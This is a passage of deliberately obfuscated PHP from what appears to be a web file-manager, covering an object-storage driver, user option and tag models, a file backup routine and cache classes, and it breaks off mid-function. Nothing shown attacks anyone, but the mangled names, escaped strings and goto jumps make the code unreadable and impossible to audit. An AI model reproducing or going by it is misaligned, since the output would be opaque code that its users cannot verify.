$ºäÚ£´Ã[1442]; array_splice($¶äÔÈ ¼, 5, 0, $áËŠ¹‰° . $ºäÚ£´Ã[4] . $×ˆÚ£İ„[$áËŠ¹‰°]); } } if (isset($¢ışŞĞ‡[$ºäÚ£´Ã[246]]) && $¢ışŞĞ‡[$ºäÚ£´Ã[246]] == $ºäÚ£´Ã[247]) { $¶äÔÈ ¼[0] = $ºäÚ£´Ã[247]; } if (!empty($¢ışŞĞ‡[$ºäÚ£´Ã[1443]])) { $«ì¸ûõ = array_merge(array($¶äÔÈ ¼[4]), $¢ışŞĞ‡[$ºäÚ£´Ã[1443]]); sort($«ì¸ûõ); $¶äÔÈ ¼[4] = implode($ºäÚ£´Ã[248], $«ì¸ûõ); } $Ïçà’âà = implode($ºäÚ£´Ã[248], $¶äÔÈ ¼); $ûõÊÍ§ = base64_encode(hash_hmac($ºäÚ£´Ã[249], $Ïçà’âà, $this->secret, !0)); $ªĞ¹¶°† = $ºäÚ£´Ã[1407] . $this->accessKey . $ºäÚ£´Ã[4] . $ûõÊÍ§; if (strpos($Ê¦çÀë‰, $ºäÚ£´Ã[244]) === 0) { $ªĞ¹¶°† = array($ºäÚ£´Ã[251] => $ªĞ¹¶°†, $ºäÚ£´Ã[241] => $‚Œ­Éä”); if ($×ˆÚ£İ„) { $ªĞ¹¶°† = array_merge($ªĞ¹¶°†, $×ˆÚ£İ„); } } return $ªĞ¹¶°†; } public function listUploadParts($İã’’“ë, $¹’úğ½) { $—èê™”ø =& $_SERVER[ ÇƒŠìÀ]; $É®Ü©ªÃ = parse_url_query($¹’úğ½[$—èê™”ø[177]]); $Â¸Ø‘£ = $this->client->listParts($this->bucket, $this->pathEncode($İã’’“ë), $É®Ü©ªÃ[$—èê™”ø[240]]); $ü¼†í¸¸ = $Â¸Ø‘£->getListPart(); $˜‘šó½ = array(); foreach ($ü¼†í¸¸ as $—À“ûÒÂ) { $˜‘šó½[] = array($—èê™”ø[1428] => $—À“ûÒÂ->getPartNumber(), $—èê™”ø[1429] => trim($—À“ûÒÂ->getETag(), $—èê™”ø[120])); } unset($¹’úğ½[$—èê™”ø[242]], $¹’úğ½[$—èê™”ø[246]]); $ÓˆËôä‘ = $this->multiUploadAuthData($İã’’“ë, $¹’úğ½); if (empty($ÓˆËôä‘)) { return !1; } return array($—èê™”ø[251] => $ÓˆËôä‘, $—èê™”ø[241] => $¹’úğ½[$—èê™”ø[241]], $—èê™”ø[253] => $˜‘šó½); } public function download($ÛÄùº”µ, $¿ÛÑË°Î) { if ($this->isFolder($ÛÄùº”µ)) { return !1; } try { $£ïğ¦ïŞ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¿ÛÑË°Î); $£ïğ¦ïŞ = $this->trafficLimit($_SERVER[ ÇƒŠìÀ][111], $£ïğ¦ïŞ); $this->client->getObject($this->bucket, $this->pathEncode($ÛÄùº”µ), $£ïğ¦ïŞ); } catch (OSS\Core\OssException $¢§éÂö›) { return !1; } return $¿ÛÑË°Î; } public function fileSubstr($³Ôï¨’Æ, $¹ÏİÂ’¶ = 0, $ÃÏÄÊ½’ = false) { if ($¹ÏİÂ’¶ === -1) { $¬”»ªıÇ = array(); } else { if ($ÃÏÄÊ½’ === !1) { $˜‰ôŠØĞ = $this->size($³Ôï¨’Æ); } else { $˜‰ôŠØĞ = $¹ÏİÂ’¶ + $ÃÏÄÊ½’ - 1; } $¬”»ªıÇ = array(OSS\OssClient::OSS_RANGE => "{$¹ÏİÂ’¶}\x2d{$˜‰ôŠØĞ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($³Ôï¨’Æ), $¬”»ªıÇ); } catch (OSS\Core\OssException $•¡¶ş¢) { think_exception($•¡¶ş¢->getMessage()); return !1; } } private function trafficLimit($½ÌèİË„, $‘»Óİ¦Ö = array()) { $³°áÌÌ€ =& $_SERVER[ ÇƒŠìÀ]; if ($½ÌèİË„ == $³°áÌÌ€[1434] && $this->isUploadServer() || $½ÌèİË„ == $³°áÌÌ€[111] && $this->isFileOutServer()) { return $‘»Óİ¦Ö; } $œ‹¨àºé = floatval($GLOBALS[$³°áÌÌ€[6]][$³°áÌÌ€[91]][$³°áÌÌ€[109]][$½ÌèİË„]) * 1024 * 1024 * 8; if (!$œ‹¨àºé) { return $‘»Óİ¦Ö; } $œ‹¨àºé = $œ‹¨àºé < 819200 ? 819200 : ($œ‹¨àºé > 838860800 ? 838860800 : $œ‹¨àºé); $‘»Óİ¦Ö[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($œ‹¨àºé); return $‘»Óİ¦Ö; } public function link($Æ×ì¡ôì, $£­ÕùÅ¼ = array()) { $û³°­á =& $_SERVER[ ÇƒŠìÀ]; if (!$this->exist($Æ×ì¡ôì) || $this->isFolder($Æ×ì¡ôì)) { return !1; } try { $£­ÕùÅ¼ = $this->trafficLimit($û³°­á[111], $£­ÕùÅ¼); $ÛÀ²¶¡ = $this->client->signUrl($this->bucket, $this->pathEncode($Æ×ì¡ôì), 3600 * 12, $û³°­á[247], $£­ÕùÅ¼); return $this->getCdnLink($ÛÀ²¶¡); } catch (OSS\Core\OssException $¿É…®·) { return !1; } } public function fileOut($¸š¥ŒË‡, $½¿¾ñóİ = false, $ïíƒ…œñ = false, $î˜å­š½ = '') { $Ï¥›‹ó =& $_SERVER[ ÇƒŠìÀ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¸š¥ŒË‡, $½¿¾ñóİ, $ïíƒ…œñ, $î˜å­š½); } if (!$ïíƒ…œñ) { $ïíƒ…œñ = $this->pathThis($¸š¥ŒË‡); } $ïíƒ…œñ = rawurlencode($ïíƒ…œñ); $ìô­Õƒ® = get_file_mime(get_path_ext($ïíƒ…œñ)); if ($ìô­Õƒ® == $Ï¥›‹ó[234]) { return parent::fileOut($¸š¥ŒË‡, $½¿¾ñóİ, $ïíƒ…œñ, $î˜å­š½); } $½¿¾ñóİ = $½¿¾ñóİ ? $Ï¥›‹ó[1444] : $Ï¥›‹ó[1445]; $¡Œ¸ñÇÔ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ï¥›‹ó[1446] . rawurlencode("{$½¿¾ñóİ}\x3b\146\151\154\x65\156\141\155\145\75{$ïíƒ…œñ}")); $¡Œ¸ñÇÔ[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ï¥›‹ó[1447] . rawurlencode($ìô­Õƒ®); $µ¾Ù÷ê = $this->link($¸š¥ŒË‡, $¡Œ¸ñÇÔ); $this->fileOutLink($µ¾Ù÷ê); } public function fileOutServer($œÕ›Óš‡, $ûÄàÉ = false, $ø÷Åƒ…Š = false, $»ò™»±› = '') { parent::fileOut($œÕ›Óš‡, $ûÄàÉ, $ø÷Åƒ…Š, $»ò™»±›); } public function fileOutImage($‡Çâ–€é, $ë»Œƒ = 250) { if ($this->size($‡Çâ–€é) > 1024 * 1024 * 20) { return $this->fileOutImageServer($‡Çâ–€é, $ë»Œƒ); } $§áÂ÷ç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ ÇƒŠìÀ][1404] . $ë»Œƒ); $¹ï±©²É = $this->link($‡Çâ–€é, $§áÂ÷ç); $this->fileOutLink($¹ï±©²É); } public function fileOutImageServer($°Ğøİ¦Š, $Î›ĞÃ›‰ = 250) { parent::fileOutImage($°Ğøİ¦Š, $Î›ĞÃ›‰); } public function fileOutLink($Áä€ıíñ) { $¶ûäÊšî =& $_SERVER[ ÇƒŠìÀ]; if (!$this->isCdnHost() && substr($Áä€ıíñ, 0, 7) == $¶ûäÊšî[1366]) { $Áä€ıíñ = $¶ûäÊšî[1367] . substr($Áä€ıíñ, 7); } header($¶ûäÊšî[164] . $Áä€ıíñ); die; } public function hashMd5($½¦ıê¥, $ïÅªõ = '') { $×½´ğ Ñ =& $_SERVER[ ÇƒŠìÀ]; $åºòÁÒè = $this->_objectMeta($½¦ıê¥); if (!$åºòÁÒè) { return $×½´ğ Ñ[12]; } if (!isset($åºòÁÒè[$×½´ğ Ñ[1424]]) && !empty($ïÅªõ)) { $›Öº³˜” = $this->updateObjMeta($½¦ıê¥, array($×½´ğ Ñ[1424] => $ïÅªõ)); $åºòÁÒè[$×½´ğ Ñ[1424]] = $›Öº³˜” ? $ïÅªõ : $×½´ğ Ñ[12]; } return isset($åºòÁÒè[$×½´ğ Ñ[1424]]) ? strtolower($åºòÁÒè[$×½´ğ Ñ[1424]]) : $×½´ğ Ñ[12]; } public function size($„ä¿ÉÂ) { $Üğã ¥† = $this->objectMeta($„ä¿ÉÂ); return $Üğã ¥† ? $Üğã ¥†[$_SERVER[ ÇƒŠìÀ][78]] : 0; } public function info($Æ’”ğúñ) { if ($this->isFolder($Æ’”ğúñ)) { return $this->folderInfo($Æ’”ğúñ); } else { if ($this->isFile($Æ’”ğúñ)) { return $this->fileInfo($Æ’”ğúñ); } } return !1; } public function exist($×óü¶³) { return $this->isFile($×óü¶³) || $this->isFolder($×óü¶³); } public function isFile($·ÃÄÂÈˆ) { return !$this->isFolder($·ÃÄÂÈˆ) && $this->objectMeta($·ÃÄÂÈˆ); } public function isFolder($˜è˜™Ç) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][168], $˜è˜™Ç); } protected function objectMeta($­ãÓµéõ) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][170], $­ãÓµéõ); } protected function _objectMeta($ŞÔ¿£ú) { $ññ¤Î =& $_SERVER[ ÇƒŠìÀ]; try { $Š°íÅÔ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ŞÔ¿£ú)); } catch (OSS\Core\OssException $ˆ¶ ÕŞ) { $Š°íÅÔ = !1; } if ($Š°íÅÔ) { $Š°íÅÔ[$ññ¤Î[78]] = intval($Š°íÅÔ[$ññ¤Î[1422]]); } return $Š°íÅÔ; } protected function _isFolder($İğ¿æË‹) { $Ó—ö–€† =& $_SERVER[ ÇƒŠìÀ]; if ($İğ¿æË‹ == $Ó—ö–€†[12] || $İğ¿æË‹ == $Ó—ö–€†[8]) { return !0; } $‘Ëƒ¢´› = array($Ó—ö–€†[1417] => $Ó—ö–€†[8], $Ó—ö–€†[1418] => rtrim($İğ¿æË‹, $Ó—ö–€†[8]) . $Ó—ö–€†[8], $Ó—ö–€†[1419] => 1, $Ó—ö–€†[1420] => $Ó—ö–€†[12]); $‡±§æº = $this->client->listObjects($this->bucket, $‘Ëƒ¢´›); if ($‡±§æº->getObjectList() || $‡±§æº->getPrefixList()) { return !0; } return !1; } } goto Dˆ°„Èßø; D›À°Çì: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‹›Æ…üÁ) { $ûÓåØĞŞ =& $_SERVER[ ÇƒŠìÀ]; $”ò†–ƒ‘ = defined($ûÓåØĞŞ[2109]) && USER_ID ? USER_ID : $ûÓåØĞŞ[12]; return "\125\163\x65\162\x4f\160\164\151\157\x6e\137{$‹›Æ…üÁ}\137" . $”ò†–ƒ‘; } protected function filterWhere($Êßœ¶¶±) { $ìº×ª¡Ò =& $_SERVER[ ÇƒŠìÀ]; $Êßœ¶¶±[$ìº×ª¡Ò[1689]] = defined($ìº×ª¡Ò[2109]) && USER_ID ? USER_ID : $ìº×ª¡Ò[12]; return $Êßœ¶¶±; } public function cacheRemoveUser($å•š¹Ğ, $•‹ğª…Î) { return Cache::remove("\125\163\145\162\x4f\160\164\151\x6f\x6e\x5f{$å•š¹Ğ}\x5f" . $•‹ğª…Î); } protected function optionDefault($ğ€¾Àì = '') { $ñ¿¸ºÇî =& $_SERVER[ ÇƒŠìÀ]; if ($ğ€¾Àì == $ñ¿¸ºÇî[12]) { return $GLOBALS[$ñ¿¸ºÇî[6]][$ñ¿¸ºÇî[2387]]; } if ($ğ€¾Àì == $ñ¿¸ºÇî[2388]) { return $GLOBALS[$ñ¿¸ºÇî[6]][$ñ¿¸ºÇî[2389]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\x74\x61\x67\114\x69\163\164"; public $modelType = "\x55\x73\x65\162\x4f\x70\x74\x69\x6f\156"; public $field = array("\156\141\155\x65", "\x73\164\171\x6c\x65", "\163\x6f\x72\x74"); public function listData($Õ‘œ = false, $äŠÔÊ£ = "\163\157\162\164", $¾×üÃŒ‡ = false) { return parent::listData($Õ‘œ, $äŠÔÊ£, $¾×üÃŒ‡); } public function remove($ÌÃÂòÄå) { return parent::remove($ÌÃÂòÄå); } public function add($ÆÔæ©ŒÉ, $½Ïç…¥Ú = "\154\141\x62\x65\154\x2d\147\x72\145\171\x2d\156\x6f\x72\155\x61\154") { $¢Ú ï‘ =& $_SERVER[ ÇƒŠìÀ]; if ($this->findByName($ÆÔæ©ŒÉ)) { return !1; } $ß ²ê©Ä = array($¢Ú ï‘[464] => $ÆÔæ©ŒÉ, $¢Ú ï‘[529] => $½Ïç…¥Ú, $¢Ú ï‘[1891] => $this->getSort($¢Ú ï‘[304]) + 1); return parent::insert($ß ²ê©Ä); } public function update($èÀÏÏ¨È, $ìê—¸¸¨) { $êÉ˜×„ =& $_SERVER[ ÇƒŠìÀ]; $²¨”Ÿˆ¤ = $this->listData($èÀÏÏ¨È); $•¢¹şÛĞ = $this->findByName($ìê—¸¸¨[$êÉ˜×„[32]]); if (!$²¨”Ÿˆ¤ || $•¢¹şÛĞ && $•¢¹şÛĞ[$êÉ˜×„[445]] != $²¨”Ÿˆ¤[$êÉ˜×„[445]]) { return !1; } return parent::update($èÀÏÏ¨È, $ìê—¸¸¨); } public function moveTop($ÑËÇ®¬) { $»ãğëÉï =& $_SERVER[ ÇƒŠìÀ]; $¤Ó³Ë¤Î = parent::listData(); $­ã»Ê = $this->getSort($»ãğëÉï[303]); foreach ($¤Ó³Ë¤Î as &$„ğÛ—Şß) { if ($„ğÛ—Şß[$»ãğëÉï[445]] == $ÑËÇ®¬) { $„ğÛ—Şß[$»ãğëÉï[1911]] = $­ã»Ê; continue; } $„ğÛ—Şß[$»ãğëÉï[1911]] += 1; } unset($„ğÛ—Şß); return parent::resetData($¤Ó³Ë¤Î); } public function moveBottom($ßİÑØÇ) { $€õõ„àÓ =& $_SERVER[ ÇƒŠìÀ]; $ûïÅÍ† = $this->getSort($€õõ„àÓ[304]) + 1; return parent::update($ßİÑØÇ, array($€õõ„àÓ[1911] => $ûïÅÍ†)); } public function resetSort($¾¦èéè) { $Î³««ßÂ =& $_SERVER[ ÇƒŠìÀ]; $“ŸÜ”Íƒ = array(); $¾¦èéè = is_array($¾¦èéè) ? $¾¦èéè : array(); for ($´ÙÓƒ¾ = 0; $´ÙÓƒ¾ < count($¾¦èéè); $´ÙÓƒ¾++) { $“ŸÜ”Íƒ[$¾¦èéè[$´ÙÓƒ¾] . $Î³««ßÂ[12]] = $´ÙÓƒ¾ + 1; } $°»àÀŠÔ = parent::listData(); foreach ($°»àÀŠÔ as &$ À²œ•Ä) { $ÀÑÃ óİ = $“ŸÜ”Íƒ[$ À²œ•Ä[$Î³««ßÂ[445]]]; $ À²œ•Ä[$Î³««ßÂ[1911]] = $ÀÑÃ óİ ? $ÀÑÃ óİ : $ À²œ•Ä[$Î³««ßÂ[1911]]; } unset($ À²œ•Ä); return parent::resetData($°»àÀŠÔ); } private function getSort($êø”’°) { $…æóàÉÏ =& $_SERVER[ ÇƒŠìÀ]; $ŞÒšùÎ­ = parent::listData(); $œ¤Æ™Üı = array_to_keyvalue($ŞÒšùÎ­, $…æóàÉÏ[12], $…æóàÉÏ[1911]); if (!$œ¤Æ™Üı) { $œ¤Æ™Üı = array(0); } $‹ç§§¹õ = $êø”’° == $…æóàÉÏ[304] ? max($œ¤Æ™Üı) : min($œ¤Æ™Üı); return intval($‹ç§§¹õ); } } $_file = $_SERVER[$_SERVER[ ÇƒŠìÀ][907]]; goto dÚ°˜¬àêŞ; fÖ¯ÑõÄï: class BackupFile { public function __construct() { } public function index() { $­ã¢ÆÀÖ = Backup::get(); $Í¶ïœâ = $­ã¢ÆÀÖ[$_SERVER[ ÇƒŠìÀ][339]][$_SERVER[ ÇƒŠìÀ][216]][$_SERVER[ ÇƒŠìÀ][511]]; $Ñ†İÇÑ¯ = array($_SERVER[ ÇƒŠìÀ][512] => array($_SERVER[ ÇƒŠìÀ][836], $Í¶ïœâ), $_SERVER[ ÇƒŠìÀ][837] => array($_SERVER[ ÇƒŠìÀ][377], $­ã¢ÆÀÖ[$_SERVER[ ÇƒŠìÀ][780]])); $şìš²Ç‚ = (int) Model($_SERVER[ ÇƒŠìÀ][818])->where($Ñ†İÇÑ¯)->count($_SERVER[ ÇƒŠìÀ][511]); $Å€³åå¦ = (int) Model($_SERVER[ ÇƒŠìÀ][818])->where($Ñ†İÇÑ¯)->sum($_SERVER[ ÇƒŠìÀ][78]); $ùÆóí–ª = new TaskFileTransfer($_SERVER[ ÇƒŠìÀ][838], $_SERVER[ ÇƒŠìÀ][809], $şìš²Ç‚, LNG($_SERVER[ ÇƒŠìÀ][810]) . $_SERVER[ ÇƒŠìÀ][811] . LNG($_SERVER[ ÇƒŠìÀ][839])); $ùÆóí–ª->task[$_SERVER[ ÇƒŠìÀ][792]] = $Å€³åå¦; $Ê÷æåşÚ = array($_SERVER[ ÇƒŠìÀ][840] => $şìš²Ç‚, $_SERVER[ ÇƒŠìÀ][841] => $Å€³åå¦, $_SERVER[ ÇƒŠìÀ][842] => time()); Backup::set($Ê÷æåşÚ); $ïªƒ‚©Ğ = !0; $æ ùï¶’ = $this->storeIds(); $İÜ»ƒ´é = 1; $î½Ôàíê = 1000; $’ÃçÁ˜ = $µñÊä» = 0; $¼›…†¥  = array(); $ ™Ôä†¡ = $ş©ÏÓ = 0; do { $î¬óÕÂ™ = $_SERVER[ ÇƒŠìÀ][843]; $ĞÜí‚Í¯ = Model($_SERVER[ ÇƒŠìÀ][818])->where($Ñ†İÇÑ¯)->field($î¬óÕÂ™)->order($_SERVER[ ÇƒŠìÀ][844])->selectPage($î½Ôàíê, $İÜ»ƒ´é); $„Øˆ›š‘ = !empty($ĞÜí‚Í¯[$_SERVER[ ÇƒŠìÀ][415]]) ? $ĞÜí‚Í¯[$_SERVER[ ÇƒŠìÀ][415]] : array(); foreach ($„Øˆ›š‘ as $ÇÊÇùÀÅ) { if (!$this->_fileExist($ÇÊÇùÀÅ, $¼›…†¥ , $æ ùï¶’)) { $şìš²Ç‚ -= 1; $Å€³åå¦ -= (int) $ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][78]]; write_log("\x66\x69\x6c\x65\x20\156\157\164\x20\x65\170\x69\163\164\x2e\146\151\x6c\145\111\104\x3a{$ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][511]]}\54\40\x70\x61\x74\150\x3a{$ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][86]]}", $_SERVER[ ÇƒŠìÀ][845]); continue; } $ñ­¿çóü = $ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][86]]; $›ï÷ù¬ó = "\x7b\x69\x6f\72{$­ã¢ÆÀÖ[$_SERVER[ ÇƒŠìÀ][780]]}\175" . substr($ñ­¿çóü, strlen("\173\x69\x6f\x3a{$ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][846]]}\x7d")); if (IO::exist($›ï÷ù¬ó)) { $ùÆóí–ª->updateFileEnd($ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][32]], $ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][78]]); } else { $›ï÷ù¬ó = get_path_father($›ï÷ù¬ó); IO::mkdir($›ï÷ù¬ó); if (!IO::copy($ñ­¿çóü, $›ï÷ù¬ó, $_SERVER[ ÇƒŠìÀ][847])) { write_log($_SERVER[ ÇƒŠìÀ][848] . $ñ­¿çóü . $_SERVER[ ÇƒŠìÀ][832] . $›ï÷ù¬ó . $_SERVER[ ÇƒŠìÀ][167], $_SERVER[ ÇƒŠìÀ][809]); $ïªƒ‚©Ğ = !1; break; } } $Í¶ïœâ = $ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][511]]; $µñÊä» += 1; $’ÃçÁ˜ += $ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][78]]; $ş©ÏÓ += 1; $ ™Ôä†¡ += $ÇÊÇùÀÅ[$_SERVER[ ÇƒŠìÀ][78]]; if ($’ÃçÁ˜ >= 1024 * 1024 * 100) { $Ê÷æåşÚ = array($_SERVER[ ÇƒŠìÀ][849] => $Í¶ïœâ, $_SERVER[ ÇƒŠìÀ][850] => $ş©ÏÓ, $_SERVER[ ÇƒŠìÀ][851] => $ ™Ôä†¡); Backup::set($Ê÷æåşÚ); $’ÃçÁ˜ = $µñÊä» = 0; } } $€ñ´¤åô = count($„Øˆ›š‘); $İÜ»ƒ´é++; } while ($€ñ´¤åô == $î½Ôàíê); $ùÆóí–ª->end(); $Ê÷æåşÚ = array($_SERVER[ ÇƒŠìÀ][852] => 1, $_SERVER[ ÇƒŠìÀ][790] => time(), $_SERVER[ ÇƒŠìÀ][804] => 1, $_SERVER[ ÇƒŠìÀ][849] => $Í¶ïœâ, $_SERVER[ ÇƒŠìÀ][841] => $Å€³åå¦, $_SERVER[ ÇƒŠìÀ][840] => $şìš²Ç‚, $_SERVER[ ÇƒŠìÀ][853] => time()); if ($µñÊä») { $Ê÷æåşÚ[$_SERVER[ ÇƒŠìÀ][850]] = $ş©ÏÓ; $Ê÷æåşÚ[$_SERVER[ ÇƒŠìÀ][851]] = $ ™Ôä†¡; } Backup::set($Ê÷æåşÚ); $this->_fileFilter($¼›…†¥ ); return !0; } private function _fileExist($±‰Î©”È, &$–àŠ‰ùÙ, $Ô·ãâ¤Ş) { $²¬éÅòƒ =& $_SERVER[ ÇƒŠìÀ]; $üä¾ïóú = $±‰Î©”È[$²¬éÅòƒ[86]]; if (in_array($±‰Î©”È[$²¬éÅòƒ[511]], $–àŠ‰ùÙ)) { return !1; } if (!in_array($±‰Î©”È[$²¬éÅòƒ[846]], $Ô·ãâ¤Ş)) { return !1; } if (IO::exist($üä¾ïóú)) { return !0; } $–ğà‰¿À = get_path_father($üä¾ïóú); if (IO::exist($–ğà‰¿À)) { $–àŠ‰ùÙ[] = $±‰Î©”È[$²¬éÅòƒ[511]]; return !1; } $ÁÌî÷í™ = array($²¬éÅòƒ[846] => $±‰Î©”È[$²¬éÅòƒ[846]], $²¬éÅòƒ[86] => array($²¬éÅòƒ[429], "{$–ğà‰¿À}\45")); $‰§ÍîÃ = Model($²¬éÅòƒ[818])->where($ÁÌî÷í™)->field($²¬éÅòƒ[512])->select(); $–àŠ‰ùÙ = array_merge($–àŠ‰ùÙ, array_to_keyvalue($‰§ÍîÃ, $²¬éÅòƒ[12], $²¬éÅòƒ[511])); return !1; } private function _fileFilter($æ“ò––) { $ÍåÏÀ£® =& $_SERVER[ ÇƒŠìÀ]; if (empty($æ“ò––)) { return; } $„±µ¿‹ = array($ÍåÏÀ£®[511] => array($ÍåÏÀ£®[7], array_unique($æ“ò––))); $¦‘åè¨² = Model($ÍåÏÀ£®[854])->where($„±µ¿‹)->field($ÍåÏÀ£®[183])->select(); foreach ($¦‘åè¨² as $‰¦°ı‹) { Model($ÍåÏÀ£®[854])->remove($‰¦°ı‹[$ÍåÏÀ£®[183]], !1); } } private function storeIds() { $¡÷ÅÈùî =& $_SERVER[ ÇƒŠìÀ]; $¥‹ Œú¼ = Model($¡÷ÅÈùî[796])->listData(); $šÃ”ÇŒ = array(); $ë­¢µ› = $GLOBALS[$¡÷ÅÈùî[6]][$¡÷ÅÈùî[91]][$¡÷ÅÈùî[855]]; foreach ($¥‹ Œú¼ as $ğëÜÒæ®) { $şã­·¹Æ = strtolower($ğëÜÒæ®[$¡÷ÅÈùî[97]]); if (!isset($ë­¢µ›[$şã­·¹Æ])) { continue; } $“¡ÜÎ»Ñ = $¡÷ÅÈùî[76] . (isset($ë­¢µ›[$şã­·¹Æ]) ? $ë­¢µ›[$şã­·¹Æ] : ucfirst($şã­·¹Æ)); if (!class_exists($“¡ÜÎ»Ñ)) { continue; } $šÃ”ÇŒ[] = $ğëÜÒæ®[$¡÷ÅÈùî[445]]; } return $šÃ”ÇŒ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $å¨±Şëœ =& $_SERVER[ ÇƒŠìÀ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $õïœ…»ï = $GLOBALS[$å¨±Şëœ[6]][$å¨±Şëœ[395]]; $„ÓÊû¨ = $õïœ…»ï[$õïœ…»ï[$å¨±Şëœ[856]]]; $Ïš„äİä = $õïœ…»ï[$å¨±Şëœ[857]]; switch ($õïœ…»ï[$å¨±Şëœ[856]]) { case $å¨±Şëœ[21]: self::$handle = Model($å¨±Şëœ[858]); break; case $å¨±Şëœ[859]: self::$handle = new CacheRedis($„ÓÊû¨, $Ïš„äİä); break; case $å¨±Şëœ[860]: self::$handle = new CacheMemcached($„ÓÊû¨, $Ïš„äİä); break; case $å¨±Şëœ[216]: self::$handle = new CacheFile($„ÓÊû¨, $Ïš„äİä); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ü¶¡­é) { if (is_array($Ü¶¡­é) || is_object($Ü¶¡­é)) { $Ü¶¡­é = json_encode($Ü¶¡­é); } $Ü¶¡­é = rawurlencode($Ü¶¡­é); return md5(KOD_SITE_ID . $_SERVER[ ÇƒŠìÀ][11] . $Ü¶¡­é); } public static function get($÷³·¹á´, $óáïãè = false) { $Òæ‚é î = self::key($÷³·¹á´); $Èğ÷½ßã = self::init(); if ($óáïãè) { return unserialize($Èğ÷½ßã->get($Òæ‚é î)); } if (!isset(self::$memoryCache[$Òæ‚é î])) { $ç§§ö¢ = $Èğ÷½ßã->get($Òæ‚é î); self::$memoryCache[$Òæ‚é î] = unserialize($ç§§ö¢); } return self::$memoryCache[$Òæ‚é î]; } public static function set($êåĞìŞŸ, $ÚÁä ¯•, $¾åüïéø = false) { $ºÇæÈå™ =& $_SERVER[ ÇƒŠìÀ]; $ÊãÌÕëË = self::key($êåĞìŞŸ); if (isset(self::$memoryCache[$ÊãÌÕëË]) && self::$memoryCache[$ÊãÌÕëË] === $ÚÁä ¯•) { return !0; } if ($¾åüïéø === 0) { self::$memoryCache[$ÊãÌÕëË] = $ÚÁä ¯•; return !0; } $Şî™ = self::init(); $ãÔÉìµ = serialize($ÚÁä ¯•); CacheLock::lock($êåĞìŞŸ . $ºÇæÈå™[861]); $çİûğ¿Ç = $Şî™->set($ÊãÌÕëË, $ãÔÉìµ, $¾åüïéø); self::$memoryCache[$ÊãÌÕëË] = $ÚÁä ¯•; CacheLock::unlock($êåĞìŞŸ . $ºÇæÈå™[861]); return $çİûğ¿Ç; } public static function getCall($ûÕÊƒšŒ, $­™á©ÈÈ, $ñçÀíœ, $İØ•Õ÷Š = array()) { $µóÆßó =& $_SERVER[ ÇƒŠìÀ]; $ÂÏËä¼Ù = self::get($ûÕÊƒšŒ); if ($ÂÏËä¼Ù || $ÂÏËä¼Ù === $µóÆßó[12]) { return $ÂÏËä¼Ù; } $ÂÏËä¼Ù = call_user_func_array($ñçÀíœ, $İØ•Õ÷Š); $ÂÏËä¼Ù = $ÂÏËä¼Ù ? $ÂÏËä¼Ù : $µóÆßó[12]; self::set($ûÕÊƒšŒ, $ÂÏËä¼Ù, $­™á©ÈÈ); return $ÂÏËä¼Ù; } public static function remove($¢õ«³Õ) { $¶’çğª› = self::key($¢õ«³Õ); unset(self::$memoryCache[$¶’çğª›]); self::clearTimeout(); CacheLock::lock($¢õ«³Õ); $Ìù¥ï³ô = self::init()->remove($¶’çğª›); CacheLock::unlock($¢õ«³Õ); return $Ìù¥ï³ô; } public static function removeMemory($ş’»‚Ò›) { $•Æ’Øî“ = self::key($ş’»‚Ò›); unset(self::$memoryCache[$•Æ’Øî“]); } public static function clearMemory($»çëŞÄÚ = false) { if ($»çëŞÄÚ) { $»çëŞÄÚ = self::key($»çëŞÄÚ); unset(self::$memoryCache[$»çëŞÄÚ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ ÇƒŠìÀ][862])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ ÇƒŠìÀ][863])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¢Œ¨¬êÓ, $ ±‹šä›) { $•Î»šÓ  =& $_SERVER[ ÇƒŠìÀ]; $this->cachePath = $¢Œ¨¬êÓ[$•Î»šÓ [86]]; $this->prefix = $•Î»šÓ [864]; $this->cacheTime = $ ±‹šä›; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ˆğ¥¶) { $Éåë­âö =& $_SERVER[ ÇƒŠìÀ]; $ˆğ¥¶ = str_replace(array($Éåë­âö[865], $Éåë­âö[99], $Éåë­âö[75]), $Éåë­âö[866], $ˆğ¥¶); return $this->cachePath . $Éåë­âö[867] . $ˆğ¥¶ . $Éåë­âö[868]; } public function set($ƒÖçÑÔÂ, $ñîšöé¶, $±º¡ÖŠ§ = false) { $±º¡ÖŠ§ = $±º¡ÖŠ§ ? $±º¡ÖŠ§ : $this->cacheTime; $ßÉ´½Ú = $this->getFile($ƒÖçÑÔÂ); if (file_put_contents($ßÉ´½Ú, $this->prefix . $ñîšöé¶, LOCK_EX)) { @touch($ßÉ´½Ú, intval(time() + $±º¡ÖŠ§)); clearstatcache(); return !0; } @unlink($ßÉ´½Ú); return !1; } public function get($Ö‰ëùÕû) { $ıº‘•±¹ = 